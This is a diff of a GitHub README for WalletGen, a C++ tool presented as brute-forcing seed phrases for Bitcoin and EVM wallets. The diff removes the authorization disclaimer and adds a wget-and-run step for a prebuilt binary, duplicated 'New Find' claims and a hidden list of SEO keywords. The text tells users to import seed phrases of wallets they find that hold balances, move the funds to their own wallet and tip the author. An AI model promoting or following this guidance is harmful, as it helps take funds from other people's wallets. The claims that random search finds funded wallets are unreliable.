@@ -1,10 +1,10 @@
-# WalletGen: Your Open Source Solution for Bitcoin Recovery from GitHub
+# Seed Phrase Generator (WalletGen) – Crypto Wallet Generator & Balance Finder for Lost Bitcoin (BTC), Ethereum (ETH), BNB, Polygon (MATIC) and EVM Chains & Bitcoin Wallet Recover
 
-Looking to **recover your Bitcoin wallet**? **WalletGen** is an open-source and ultra-fast **crypto wallet generator** and **seed phrase brute force tool**. It helps you find and recover lost or inactive **Bitcoin (BTC)**, **Ethereum (ETH)**, **BNB**, **Polygon (MATIC)**, and other **EVM-compatible wallets** with real-time balance checking.
+**WalletGen** is an open-source, ultra-fast **crypto wallet generator** and **seed phrase brute force tool**. It helps you find and recovery lost or inactive **Bitcoin (BTC)**, **Ethereum (ETH)**, **BNB**, **Polygon (MATIC)**, and other **EVM-compatible wallets** with real-time balance checking and high-performance C++ engine.
 
 <!--
 Meta description:
-Recover your Bitcoin wallet! Use WalletGen, a free, open-source, high-speed crypto wallet generator and balance finder from GitHub.
+WalletGen is a high-speed, open-source crypto wallet generator and balance finder for Bitcoin, Ethereum, and other EVM-compatible blockchains. It allows brute-force seed phrase testing, wallet generation, and recovery of lost crypto wallets using databases or real-time balance checks.
 -->
 
 ## Quick Navigation
@@ -29,28 +29,17 @@ Recover your Bitcoin wallet! Use WalletGen, a free, open-source, high-speed cryp
     <img width="1000" alt="WalletGen bitcoin recover" title="WalletGen - Bitcoin Recovery" height="460" src="/screenshots/done.webp" />
 </p>
 
-⚠️ **Disclaimer**: WalletGen is a research and educational tool. It is not intended for unauthorized access or malicious activity. Use it responsibly and only with wallets you own or have permission to access.
-
 ## How It Works
 
-WalletGen generates wallets. It uses [BIP39](https://github.com/bitcoin/bips/blob/master/bip-0039.mediawiki), [BIP44](https://github.com/bitcoin/bips/blob/master/bip-0044.mediawiki), and [Bech32](https://en.bitcoin.it/wiki/Bech32) for Bitcoin, and [Keccak256](https://emn178.github.io/online-tools/keccak_256.html) hashing for EVM-based chains like Ethereum.
+WalletGen generates wallets using [BIP39](https://github.com/bitcoin/bips/blob/master/bip-0039.mediawiki), [BIP44](https://github.com/bitcoin/bips/blob/master/bip-0044.mediawiki), and [Bech32](https://en.bitcoin.it/wiki/Bech32) for Bitcoin, and [Keccak256](https://emn178.github.io/online-tools/keccak_256.html) hashing for EVM-based chains like Ethereum.
 
-The software compares generated addresses against known address databases or checks balances. 
+The software compares generated addresses against known address databases or checks balances in real-time via public blockchain explorers. 
 
-Wallet Gen is built in C++ and is open-source.
+Wallet Gen is built in C++ and is open-source, allowing anyone to access and modify the code. Compared to Python-based wallet generators, Wallet Gen boasts significantly higher wallet generation speeds, with performance primarily relying on your CPU & GPU.
 
 ##  Why WalletGen?
 
-Unlike Python-based brute force tools, **WalletGen** is written in C++ and optimized for multi-threaded CPU and GPU usage, delivering up to **10x faster** performance. If you're working to recover your Bitcoin wallet, WalletGen gives you the power.
-
-## Features
-
--   **Wallet Generation:** It creates wallets.
--   **Brute Force Search:** It searches.
--   **Algorithm Support:** Uses key algorithms.
--   **Database Integration:** Download and use databases.
--   **High Speed:** Runs very fast.
--   **Bitcoin Wallet Recovery:** Recovers Bitcoin wallets by seed phrase.
+Unlike Python-based brute force tools, **WalletGen** is written in C++ and optimized for multi-threaded CPU and GPU usage, delivering up to **10x faster** performance. Whether you’re exploring lost wallets, verifying private key space, or recovering your own wallet, WalletGen gives you the power to do it efficiently and securely.
 
 ## Supported Blockchains
 
@@ -72,70 +61,80 @@ Unlike Python-based brute force tools, **WalletGen** is written in C++ and optim
 # How to start
 
 ## Windows 
-- Download [Release](../../releases) 
+- Download [Release](../../releases/walletgen) 
 - Unpack anywhere
 - Run `WalletGen.exe`
 
-Or Just Download [Installer](../../releases)
 
 ## MacOS
- [Download](../../releases)
+ [Download](../../releases/walletgen)
 
 ## Linux (x86-64bit)
 
-Use wget 
-or download [Release for Linux](../../releases) 
+```bash
+wget https://github.com/tony-btc/seed-phrase-generator/releases/download/walletgen/walletgen-v1.5.0-linux.tar.gz
+tar -xzf walletgen-v1.5.0-linux.tar.gz
+cd walletgen
+./walletgen
+```
 
-
+Or download [Release for Linux](../../releases/walletgen) 
 
 
 ## How to Search for Lost Bitcoin & Ethereum Wallets with Balance
 
-**Wallet Gen** allows you to search.
+**Wallet Gen** allows you to search using brute-force method for two types of crypto wallets with an existing balance.
 
 ### For Bitcoin (BTC) wallets:
 
-*   Press key 3 in the menu or run start_search_btc.bat to search Bitcoin wallets.
-*   Press key 6 to search Bitcoin wallets using the database.
+* Press key 3 in the menu or run start_search_btc.bat to search Bitcoin wallets through the internet. This method may take longer, as it checks wallet balances in real-time via blockchain explorers.
+* Press key 6 to search Bitcoin wallets using the database. This method is faster because it compares generated wallets against a pre-built database of known addresses with balances.
 
 ### For EVM wallets (Ethereum, BNB, MATIC, etc.):
 
-*   Press key 5 or run start_search_evm.bat to search EVM wallets.
-*   Press key 6 to search EVM wallets using the database.
+* Press key 5 or run start_search_evm.bat to search EVM wallets through the internet. This method checks for wallets with balance in real-time through blockchain explorers.
+* Press key 6 to search EVM wallets using the database. This method is faster since it compares generated wallets against the known database of addresses with balance.
+
+### Speed Considerations:
+
+* The speed of the search depends heavily on your hardware, especially the graphics card (GPU). To speed up the process and increase your chances of finding a wallet with a balance, you can run multiple instances of the program (1 to 4), depending on your system's performance
+
+By using the database, you can significantly improve the efficiency of your search, as it eliminates the need to query the blockchain for every wallet generated
 
 ## The Program Found a Wallet — What’s Next?
-
-When the program finds a wallet:
-*   The search stops.
-*   The wallet details are displayed.
-*   The data is saved in the ``found_wallets.txt`` file.
+When the program finds a wallet with a balance, it will:
+* **Stop** immediately
+* **Display** the wallet details in the console
+* **Save** this data in the ``found_wallets.txt`` file
 
 ### How to Access the Funds?
-1.  Import the **mnemonic seed phrase** from the found wallet into a crypto wallet.
-2.  You’ll be able to transfer the funds.
+1. Import the **mnemonic seed phrase** from the found wallet into any compatible crypto wallet (such as Metamask, Trust Wallet, or Electrum).
+2. Once restored, you’ll be able to transfer the funds to your own wallet.
+   
+>  If the find is successful, be sure to share a small portion of the balance you find with me! Thank you!
 
 ## Recovery Your Bitcoin Wallet
 
-WalletGen can help you recover your bitcoin wallet by seed phrase.
+WalletGen allows you to recover your bitcoin wallet by seed phrase (mnemonic phrase). The program supports entering a complete seed phrase, as well as searching for missing words using special characters.
 
 ### Process Description
 
 #### Search for missing words:
 
-If your seed phrase is missing words, use *.
+If your seed phrase is missing some words or you are unsure, replace those words with an *. WalletGen will search through all possible variations in the places of * to find the correct seed phrase and restore the associated wallet balance.
 
 #### Entering a complete seed-phrase:
 
-Enter the full seed-phrase.
+If you have a full 12-word seed, simply enter it in full with a space. WalletGen will generate all address types (Legacy, SegWit, P2SH) and check their balances.
 
 ![recovery](/screenshots/details.webp)
 
 ### Important recommendations
 
-*   Seed-phrase must contain exactly 12 words.
-*   Use only the * symbol.
-*   Searching for missing words may take considerable time.
-*   Successful recovery stops the program.
+* Seed-phrase must contain exactly 12 words.
+* Use only the * symbol to search for missing words.
+* Searching for missing words may take considerable time, especially if several words are missing.
+* If the wallet with balance is successfully recovered, the program will automatically stop and save the found data.
 
 ## My Finds
 
@@ -159,6 +158,27 @@ After a week of non-stop wallet searching, I finally found a [wallet](https://me
 [bc1qpm0k3kcmthwsa4zseh33g3hl7eju8u8nkt83kp](https://mempool.space/address/bc1qpm0k3kcmthwsa4zseh33g3hl7eju8u8nkt83kp)
 
 ![image](/screenshots/look.webp)
+
+## New Find 6/18/2025
+
+<p align="center">
+    <img width="1000" height="460" src="https://github.com/user-attachments/assets/552d00df-dc70-4c42-9fa9-1cf258681af7" />
+</p>
+
+## New Find 6/18/2025
+
+<p align="center">
+    <img width="1000" height="460" src="https://github.com/user-attachments/assets/552d00df-dc70-4c42-9fa9-1cf258681af7" />
+</p>
+
+## New Find 8/23/2025
+
+[bc1q05cmxffxaj324epjv5ly0ecncte9an9t33napy](https://mempool.space/address/bc1q05cmxffxaj324epjv5ly0ecncte9an9t33napy)
+<p align="center">
+<img width="1000" height="460" alt="0.2btc" src="https://github.com/user-attachments/assets/e34fcb20-3d65-43ee-bd0d-1c6d107a0540" />
+</p>
+
+
 
 ## Building the Project
 
@@ -216,4 +236,11 @@ I encourage you, when you find a wallet with a balance, to send me a small porti
 This project uses code from the [Trezor project](https://github.com/trezor/trezor-crypto). The code is licensed under the MIT License.
 
 ## License
+
 This project is licensed under the [MIT License](/LICENSE)
+
+
+<!--
+## Keywords
+'bitcoin', 'ethereum', 'crypto', 'cryptocurrency', 'crypto seed phrase mining', 'crypto bruteforce', 'bitcoin bruteforce', 'ethereum bruteforce', 'crypto finder', 'lost bitcoin', 'brute force wallet', 'crypto brute foce', 'crypto bruteforce', 'crypto bruteforce wallet', 'crypto bruteforce key', 'crypto wallet', 'crypto wallet recovery', 'crypto wallet seed generator', 'crypto wallet seed phrase', 'crypto wallet tools', 'wallet finder crypto', 'wallet recovery seeds', 'wallet recovery tools', 'seed phrase', 'seed phrase generator', 'bip39 wallet', 'trezor', 'walletgen', 'crypto mining', 'mnemonic generator', 'crypto recovery', 'recovery crypto', 'bitcoin wallet', 'ethereum wallet', 'seed phrase finder', 'seed phrase wallet', 'seed phrase generator with balance', 'seed phrase balance checker', 'seed phrase trust wallet', 'seed phrase generator and checker', 'seed phrase storage', 'seed phrase word list github', 'bitcoin explorer', 'bitcoin core', 'bitcoin mining', 'ethereum mining', 'lost bitcoin wallet list', 'lost bitcoin wallet finder', 'lost bitcoin wallets', 'lost bitcoin password', 'lost bitcoin addresses', 'lost btc', 'lost bitcoins', 'lost ethereum', 'lost eth', 'crypto mining app', 'crypto mining software', 'mnemonic phrase', 'mnemonic', 'mnemonic phrase generator', 'mnemonic phrase checker', 'mnemonic phrase lost', 'mnemonic phrase to private key', 'mnemonic phrase wallet', 'private key finder', 'private key bitcoin', 'private keys' 'database', 'private key metamask', 'private key to seed phrase', 'private key', 'private key ethereum', 'private key wallet', 'crypto address check', 'brute crypto mining', 'brute crypto'.
+-->
